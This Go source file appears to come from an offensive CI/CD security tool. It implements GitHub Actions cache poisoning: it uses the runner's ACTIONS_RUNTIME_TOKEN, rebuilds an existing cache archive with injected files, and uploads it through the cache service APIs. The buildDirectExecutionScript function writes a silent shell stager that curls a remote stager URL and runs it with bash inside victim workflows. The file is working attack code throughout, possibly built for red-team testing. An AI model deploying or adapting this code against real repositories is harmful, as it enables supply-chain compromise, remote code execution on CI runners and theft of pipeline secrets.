// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package cachepoison

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path"
	"sort"
	"strings"
	"time"

	"github.com/klauspost/compress/zstd"
)

var (
	cacheHTTPClient                  = &http.Client{Timeout: 60 * time.Second}
	maxSignedCacheDownloadSize int64 = 2 * 1024 * 1024 * 1024
)

type PoisonResult struct {
	Key          string   `json:"key"`
	Version      string   `json:"version"`
	ArchiveSize  int64    `json:"archive_size"`
	CheckoutRefs []string `json:"checkout_refs,omitempty"`
	TargetPaths  []string `json:"target_paths,omitempty"`
	HadBaseEntry bool     `json:"had_base_entry,omitempty"`
}

type OverlayFile struct {
	Content []byte `json:"content,omitempty"`
	Mode    int64  `json:"mode,omitempty"`
}

type RuntimeEnvironment struct {
	RuntimeToken   string
	ResultsURL     string
	CacheURL       string
	CacheServiceV2 bool
}

func Poison(ctx context.Context, cfg DeploymentConfig) (PoisonResult, error) {
	return PoisonWithRuntime(ctx, cfg, RuntimeEnvironment{})
}

func PoisonWithRuntime(ctx context.Context, cfg DeploymentConfig, runtimeEnv RuntimeEnvironment) (PoisonResult, error) {
	var result PoisonResult
	runtimeEnv = runtimeEnv.withEnvFallback()

	root := normalizeWorkspace("")
	key, version, err := ComputeCacheEntry(root, cfg.Candidate)
	if err != nil {
		return result, err
	}

	overlay, refs, targets, err := buildOverlay(root, cfg)
	if err != nil {
		return result, err
	}
	archivePath, hadBaseEntry, err := buildArchive(ctx, runtimeEnv, key, version, overlay)
	if err != nil {
		return result, err
	}
	defer os.Remove(archivePath)

	info, err := os.Stat(archivePath)
	if err != nil {
		return result, err
	}

	if err := uploadArchive(ctx, runtimeEnv, key, version, archivePath, info.Size()); err != nil {
		return result, err
	}

	result.Key = key
	result.Version = version
	result.ArchiveSize = info.Size()
	result.CheckoutRefs = refs
	result.TargetPaths = targets
	result.HadBaseEntry = hadBaseEntry
	return result, nil
}

func buildArchive(ctx context.Context, runtimeEnv RuntimeEnvironment, key, version string, overlay map[string]OverlayFile) (archivePath string, hadBaseEntry bool, err error) {
	var basePath string
	basePath, hadBaseEntry, err = downloadExistingArchive(ctx, runtimeEnv, key, version)
	if err != nil {
		return "", false, err
	}
	if basePath != "" {
		defer os.Remove(basePath)
	}

	archiveFile, err := os.CreateTemp("", "smokedmeat-cache-*.tzst")
	if err != nil {
		return "", false, err
	}
	archivePath = archiveFile.Name()
	defer archiveFile.Close()

	zw, err := zstd.NewWriter(archiveFile)
	if err != nil {
		return "", false, err
	}
	tw := tar.NewWriter(zw)

	if basePath != "" {
		if err := copyTarArchive(basePath, tw); err != nil {
			tw.Close()
			zw.Close()
			return "", false, err
		}
	}

	if err := appendOverlay(tw, overlay); err != nil {
		tw.Close()
		zw.Close()
		return "", false, err
	}

	if err := tw.Close(); err != nil {
		zw.Close()
		return "", false, err
	}
	if err := zw.Close(); err != nil {
		return "", false, err
	}
	return archivePath, hadBaseEntry, nil
}

func copyTarArchive(archivePath string, writer *tar.Writer) error {
	file, err := os.Open(archivePath)
	if err != nil {
		return err
	}
	defer file.Close()

	reader, err := zstd.NewReader(file)
	if err != nil {
		return err
	}
	defer reader.Close()

	tarReader := tar.NewReader(reader)
	for {
		header, err := tarReader.Next()
		if err == io.EOF {
			return nil
		}
		if err != nil {
			return err
		}

		headerCopy := *header
		if err := writer.WriteHeader(&headerCopy); err != nil {
			return err
		}
		if header.FileInfo().Mode().IsRegular() {
			if _, err := io.Copy(writer, tarReader); err != nil {
				return err
			}
		}
	}
}

func appendOverlay(writer *tar.Writer, overlay map[string]OverlayFile) error {
	var filePaths []string
	for filePath := range overlay {
		filePaths = append(filePaths, filePath)
	}
	sort.Strings(filePaths)

	for _, filePath := range filePaths {
		file := overlay[filePath]
		mode := file.Mode
		if mode == 0 {
			mode = 0o644
		}
		header := &tar.Header{
			Name:    filePath,
			Mode:    mode,
			Size:    int64(len(file.Content)),
			ModTime: time.Now(),
		}
		if err := writer.WriteHeader(header); err != nil {
			return err
		}
		if _, err := writer.Write(file.Content); err != nil {
			return err
		}
	}
	return nil
}

func buildOverlay(root string, cfg DeploymentConfig) (overlay map[string]OverlayFile, refs, targets []string, err error) {
	return buildOverlayWithCheckoutRoot(root, cfg, "")
}

func buildOverlayWithCheckoutRoot(root string, cfg DeploymentConfig, checkoutRoot string) (overlay map[string]OverlayFile, refs, targets []string, err error) {
	plan := executionPlan(cfg.Candidate)
	switch plan.Kind {
	case ExecutionKindDirectCache:
		targetPath := absoluteVictimTargetPath(cfg.Candidate.Repository, plan.TargetPath)
		if targetPath == "" {
			return nil, nil, nil, fmt.Errorf("direct cache execution target is unknown")
		}
		overlay = map[string]OverlayFile{
			targetPath: {
				Content: []byte(buildDirectExecutionScript(cfg.VictimStagerURL, cfg.VictimCallbackID)),
				Mode:    0o755,
			},
		}
		targets = []string{targetPath}
		return overlay, nil, targets, nil
	case ExecutionKindCheckoutPost:
		refs = mergeCheckoutRefs(checkoutRefs(plan), discoverCheckoutRefsIfPresent(checkoutRoot))
		if len(refs) == 0 {
			refs = DiscoverCheckoutRefs(checkoutRoot)
		}
		overlay = OverwritePaths(cfg.VictimStagerURL, cfg.VictimCallbackID, refs)
		return overlay, refs, nil, nil
	default:
		return nil, nil, nil, fmt.Errorf("execution plan is not runtime-ready")
	}
}

func absoluteVictimTargetPath(repository, targetPath string) string {
	targetPath = strings.TrimSpace(filepathToSlash(targetPath))
	if targetPath == "" {
		return ""
	}
	if strings.HasPrefix(targetPath, "/") {
		return path.Clean(targetPath)
	}
	workspace := strings.TrimSpace(filepathToSlash(os.Getenv("GITHUB_WORKSPACE")))
	if workspace != "" {
		return path.Join(workspace, targetPath)
	}
	repoName := strings.TrimSpace(repository)
	if idx := strings.LastIndex(repoName, "/"); idx != -1 {
		repoName = repoName[idx+1:]
	}
	if repoName == "" {
		return ""
	}
	return path.Join("/home/runner/work", repoName, repoName, targetPath)
}

func filepathToSlash(value string) string {
	return strings.ReplaceAll(value, "\\", "/")
}

func buildDirectExecutionScript(stagerURL, callbackID string) string {
	markerID := sanitizeMarkerComponent(callbackID)
	if markerID == "" {
		markerID = "callback"
	}
	return strings.Join([]string{
		`RUNNER_TEMP_DIR="${RUNNER_TEMP:-/tmp}"`,
		fmt.Sprintf(`SMOKEDMEAT_CALLBACK_ID=%q`, markerID),
		`SMOKEDMEAT_RUN_ID="${GITHUB_RUN_ID:-run}"`,
		`SMOKEDMEAT_JOB_ID="${GITHUB_JOB:-job}"`,
		`SMOKEDMEAT_MARKER="$RUNNER_TEMP_DIR/.smokedmeat-exec-once-${SMOKEDMEAT_CALLBACK_ID}-${SMOKEDMEAT_RUN_ID}-${SMOKEDMEAT_JOB_ID}"`,
		`( set -C; : > "$SMOKEDMEAT_MARKER" ) 2>/dev/null || { return 0 2>/dev/null || exit 0; }`,
		fmt.Sprintf(`SMOKEDMEAT_STAGER_URL=%s`, shellSingleQuote(stagerURL)),
		`SMOKEDMEAT_TMP="$(mktemp "${RUNNER_TEMP_DIR%/}/.smokedmeat-cache.XXXXXX")" || { return 0 2>/dev/null || exit 0; }`,
		`curl -fsSL "$SMOKEDMEAT_STAGER_URL" -o "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || { rm -f "$SMOKEDMEAT_TMP"; return 0 2>/dev/null || exit 0; }`,
		`chmod 700 "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || true`,
		`/bin/bash "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || true`,
		`rm -f "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || true`,
		`return 0 2>/dev/null || exit 0`,
	}, "\n")
}

func sanitizeMarkerComponent(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}
	var builder strings.Builder
	for _, ch := range value {
		switch {
		case ch >= 'a' && ch <= 'z':
			builder.WriteRune(ch)
		case ch >= 'A' && ch <= 'Z':
			builder.WriteRune(ch)
		case ch >= '0' && ch <= '9':
			builder.WriteRune(ch)
		case ch == '-' || ch == '_':
			builder.WriteRune(ch)
		default:
			builder.WriteByte('_')
		}
	}
	return builder.String()
}

func shellSingleQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", `'"'"'`) + "'"
}

func downloadExistingArchive(ctx context.Context, runtimeEnv RuntimeEnvironment, key, version string) (targetPath string, hadBaseEntry bool, err error) {
	serviceURL, err := cacheServiceURL(runtimeEnv)
	if err != nil {
		return "", false, err
	}

	downloadURL, err := lookupDownloadURL(ctx, runtimeEnv, serviceURL, key, version)
	if err != nil {
		return "", false, err
	}
	if downloadURL == "" {
		return "", false, nil
	}

	target, err := os.CreateTemp("", "smokedmeat-cache-base-*.tzst")
	if err != nil {
		return "", false, err
	}
	targetPath = target.Name()
	target.Close()

	if err := downloadSignedURL(ctx, downloadURL, targetPath); err != nil {
		os.Remove(targetPath)
		return "", false, err
	}
	return targetPath, true, nil
}

func uploadArchive(ctx context.Context, runtimeEnv RuntimeEnvironment, key, version, archivePath string, size int64) error {
	serviceURL, err := cacheServiceURL(runtimeEnv)
	if err != nil {
		return err
	}

	if cacheServiceVersion(runtimeEnv) == "v2" {
		var uploadURL string
		uploadURL, err = createCacheEntryV2(ctx, runtimeEnv, serviceURL, key, version)
		if err != nil {
			return err
		}
		err = uploadSignedURL(ctx, uploadURL, archivePath)
		if err != nil {
			return err
		}
		return finalizeCacheEntryV2(ctx, runtimeEnv, serviceURL, key, version, size)
	}

	cacheID, err := reserveCacheV1(ctx, runtimeEnv, serviceURL, key, version, size)
	if err != nil {
		return err
	}
	if err := uploadCacheV1(ctx, runtimeEnv, serviceURL, cacheID, archivePath, size); err != nil {
		return err
	}
	return commitCacheV1(ctx, runtimeEnv, serviceURL, cacheID, size)
}

func (r RuntimeEnvironment) withEnvFallback() RuntimeEnvironment {
	if strings.TrimSpace(r.RuntimeToken) == "" {
		r.RuntimeToken = strings.TrimSpace(os.Getenv("ACTIONS_RUNTIME_TOKEN"))
	}
	if strings.TrimSpace(r.ResultsURL) == "" {
		r.ResultsURL = strings.TrimSpace(os.Getenv("ACTIONS_RESULTS_URL"))
	}
	if strings.TrimSpace(r.CacheURL) == "" {
		r.CacheURL = strings.TrimSpace(os.Getenv("ACTIONS_CACHE_URL"))
	}
	r.CacheServiceV2 = true
	return r
}

func (r RuntimeEnvironment) Merge(other RuntimeEnvironment) RuntimeEnvironment {
	if strings.TrimSpace(r.RuntimeToken) == "" {
		r.RuntimeToken = other.RuntimeToken
	}
	if strings.TrimSpace(r.ResultsURL) == "" {
		r.ResultsURL = other.ResultsURL
	}
	if strings.TrimSpace(r.CacheURL) == "" {
		r.CacheURL = other.CacheURL
	}
	r.CacheServiceV2 = true
	return r
}

func (r RuntimeEnvironment) HasServiceURL() bool {
	if r.CacheServiceV2 {
		return strings.TrimSpace(r.ResultsURL) != ""
	}
	return strings.TrimSpace(r.CacheURL) != "" || strings.TrimSpace(r.ResultsURL) != ""
}

func (r RuntimeEnvironment) Complete() bool {
	return strings.TrimSpace(r.RuntimeToken) != "" && r.HasServiceURL()
}

func cacheServiceVersion(runtimeEnv RuntimeEnvironment) string {
	_ = runtimeEnv
	return "v2"
}

func cacheServiceURL(runtimeEnv RuntimeEnvironment) (string, error) {
	switch cacheServiceVersion(runtimeEnv) {
	case "v2":
		if value := strings.TrimSpace(runtimeEnv.ResultsURL); value != "" {
			return strings.TrimRight(value, "/") + "/", nil
		}
	case "v1":
		if value := strings.TrimSpace(runtimeEnv.CacheURL); value != "" {
			return strings.TrimRight(value, "/") + "/", nil
		}
		if value := strings.TrimSpace(runtimeEnv.ResultsURL); value != "" {
			return strings.TrimRight(value, "/") + "/", nil
		}
	}
	return "", fmt.Errorf("no actions cache service URL found in environment")
}

func runtimeToken(runtimeEnv RuntimeEnvironment) (string, error) {
	value := strings.TrimSpace(runtimeEnv.RuntimeToken)
	if value == "" {
		return "", fmt.Errorf("ACTIONS_RUNTIME_TOKEN is missing")
	}
	return value, nil
}

func lookupDownloadURL(ctx context.Context, runtimeEnv RuntimeEnvironment, serviceURL, key, version string) (string, error) {
	if cacheServiceVersion(runtimeEnv) == "v2" {
		req := map[string]any{
			"key":          key,
			"restore_keys": []string{},
			"version":      version,
		}
		var resp struct {
			OK                bool   `json:"ok"`
			SignedDownloadURL string `json:"signed_download_url"`
			MatchedKey        string `json:"matched_key"`
		}
		err := postJSON(ctx, runtimeEnv, resolveTwirpURL(serviceURL, "GetCacheEntryDownloadURL"), req, &resp, true)
		if err != nil {
			return "", err
		}
		if !resp.OK || resp.SignedDownloadURL == "" {
			return "", nil
		}
		return resp.SignedDownloadURL, nil
	}

	query := url.Values{}
	query.Set("keys", key)
	query.Set("version", version)
	reqURL := strings.TrimRight(serviceURL, "/") + "/_apis/artifactcache/cache?" + query.Encode()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, reqURL, http.NoBody)
	if err != nil {
		return "", err
	}
	err = authorizeRequest(request, runtimeEnv)
	if err != nil {
		return "", err
	}
	request.Header.Set("Accept", "application/json;api-version=6.0-preview.1")

	response, err := cacheHTTPClient.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusNoContent {
		return "", nil
	}
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(response.Body, 2048))
		return "", fmt.Errorf("cache download lookup failed with status %d: %s", response.StatusCode, strings.TrimSpace(string(body)))
	}

	var body struct {
		ArchiveLocation string `json:"archiveLocation"`
	}
	if err := json.NewDecoder(response.Body).Decode(&body); err != nil {
		return "", err
	}
	return body.ArchiveLocation, nil
}

func createCacheEntryV2(ctx context.Context, runtimeEnv RuntimeEnvironment, serviceURL, key, version string) (string, error) {
	req := map[string]any{
		"key":     key,
		"version": version,
	}
	var resp struct {
		OK              bool   `json:"ok"`
		SignedUploadURL string `json:"signed_upload_url"`
		Message         string `json:"message"`
	}
	if err := postJSON(ctx, runtimeEnv, resolveTwirpURL(serviceURL, "CreateCacheEntry"), req, &resp, true); err != nil {
		return "", err
	}
	if !resp.OK || resp.SignedUploadURL == "" {
		if resp.Message == "" {
			resp.Message = "cache entry already exists or could not be created"
		}
		return "", errors.New(resp.Message)
	}
	return resp.SignedUploadURL, nil
}

func finalizeCacheEntryV2(ctx context.Context, runtimeEnv RuntimeEnvironment, serviceURL, key, version string, size int64) error {
	req := map[string]any{
		"key":        key,
		"size_bytes": fmt.Sprintf("%d", size),
		"version":    version,
	}
	var resp struct {
		OK      bool   `json:"ok"`
		EntryID string `json:"entry_id"`
		Message string `json:"message"`
	}
	if err := postJSON(ctx, runtimeEnv, resolveTwirpURL(serviceURL, "FinalizeCacheEntryUpload"), req, &resp, true); err != nil {
		return err
	}
	if !resp.OK {
		if resp.Message == "" {
			resp.Message = "cache finalize failed"
		}
		return errors.New(resp.Message)
	}
	return nil
}

func reserveCacheV1(ctx context.Context, runtimeEnv RuntimeEnvironment, serviceURL, key, version string, size int64) (int64, error) {
	req := map[string]any{
		"key":       key,
		"version":   version,
		"cacheSize": size,
	}
	var resp struct {
		CacheID int64 `json:"cacheId"`
	}
	if err := postJSON(ctx, runtimeEnv, strings.TrimRight(serviceURL, "/")+"/_apis/artifactcache/caches", req, &resp, true); err != nil {
		return 0, err
	}
	if resp.CacheID == 0 {
		return 0, fmt.Errorf("cache reserve returned no cache id")
	}
	return resp.CacheID, nil
}

func uploadCacheV1(ctx context.Context, runtimeEnv RuntimeEnvironment, serviceURL string, cacheID int64, archivePath string, size int64) error {
	file, err := os.Open(archivePath)
	if err != nil {
		return err
	}
	defer file.Close()

	reqURL := fmt.Sprintf("%s/_apis/artifactcache/caches/%d", strings.TrimRight(serviceURL, "/"), cacheID)
	request, err := http.NewRequestWithContext(ctx, http.MethodPatch, reqURL, file)
	if err != nil {
		return err
	}
	err = authorizeRequest(request, runtimeEnv)
	if err != nil {
		return err
	}
	request.Header.Set("Content-Type", "application/octet-stream")
	request.Header.Set("Content-Range", fmt.Sprintf("bytes 0-%d/*", size-1))

	response, err := cacheHTTPClient.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode < 200 || response.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(response.Body, 2048))
		return fmt.Errorf("cache upload failed with status %d: %s", response.StatusCode, strings.TrimSpace(string(body)))
	}
	return nil
}

func commitCacheV1(ctx context.Context, runtimeEnv RuntimeEnvironment, serviceURL string, cacheID, size int64) error {
	req := map[string]any{"size": size}
	return postJSON(ctx, runtimeEnv, fmt.Sprintf("%s/_apis/artifactcache/caches/%d", strings.TrimRight(serviceURL, "/"), cacheID), req, nil, true)
}

func resolveTwirpURL(serviceURL, method string) string {
	return strings.TrimRight(serviceURL, "/") + "/twirp/github.actions.results.api.v1.CacheService/" + method
}

func authorizeRequest(request *http.Request, runtimeEnv RuntimeEnvironment) error {
	token, err := runtimeToken(runtimeEnv)
	if err != nil {
		return err
	}
	request.Header.Set("Authorization", "Bearer "+token)
	return nil
}

func postJSON(ctx context.Context, runtimeEnv RuntimeEnvironment, target string, payload, out any, authRequired bool) error {
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(body))
	if err != nil {
		return err
	}
	request.Header.Set("Content-Type", "application/json")
	if authRequired {
		err = authorizeRequest(request, runtimeEnv)
		if err != nil {
			return err
		}
	}

	response, err := cacheHTTPClient.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode < 200 || response.StatusCode >= 300 {
		raw, _ := io.ReadAll(io.LimitReader(response.Body, 2048))
		return fmt.Errorf("cache request failed with status %d: %s", response.StatusCode, strings.TrimSpace(string(raw)))
	}
	if out == nil {
		return nil
	}
	return json.NewDecoder(response.Body).Decode(out)
}

func downloadSignedURL(ctx context.Context, targetURL, dstPath string) (err error) {
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, http.NoBody)
	if err != nil {
		return err
	}
	response, err := cacheHTTPClient.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode < 200 || response.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(response.Body, 2048))
		return fmt.Errorf("signed cache download failed with status %d: %s", response.StatusCode, strings.TrimSpace(string(body)))
	}
	if response.ContentLength > maxSignedCacheDownloadSize {
		return fmt.Errorf("signed cache download exceeds limit of %d bytes: got %d", maxSignedCacheDownloadSize, response.ContentLength)
	}

	file, err := os.Create(dstPath)
	if err != nil {
		return err
	}
	defer func() {
		closeErr := file.Close()
		if err == nil && closeErr != nil {
			err = closeErr
		}
		if err != nil {
			_ = os.Remove(dstPath)
		}
	}()

	written, err := io.Copy(file, io.LimitReader(response.Body, maxSignedCacheDownloadSize+1))
	if err != nil {
		return err
	}
	if written > maxSignedCacheDownloadSize {
		return fmt.Errorf("signed cache download exceeds limit of %d bytes", maxSignedCacheDownloadSize)
	}
	return nil
}

func uploadSignedURL(ctx context.Context, targetURL, archivePath string) error {
	file, err := os.Open(archivePath)
	if err != nil {
		return err
	}
	defer file.Close()

	info, err := file.Stat()
	if err != nil {
		return err
	}

	request, err := http.NewRequestWithContext(ctx, http.MethodPut, targetURL, file)
	if err != nil {
		return err
	}
	request.ContentLength = info.Size()
	request.Header.Set("Content-Type", "application/octet-stream")
	request.Header.Set("x-ms-blob-type", "BlockBlob")

	response, err := cacheHTTPClient.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode < 200 || response.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(response.Body, 2048))
		return fmt.Errorf("signed cache upload failed with status %d: %s", response.StatusCode, strings.TrimSpace(string(body)))
	}
	return nil
}
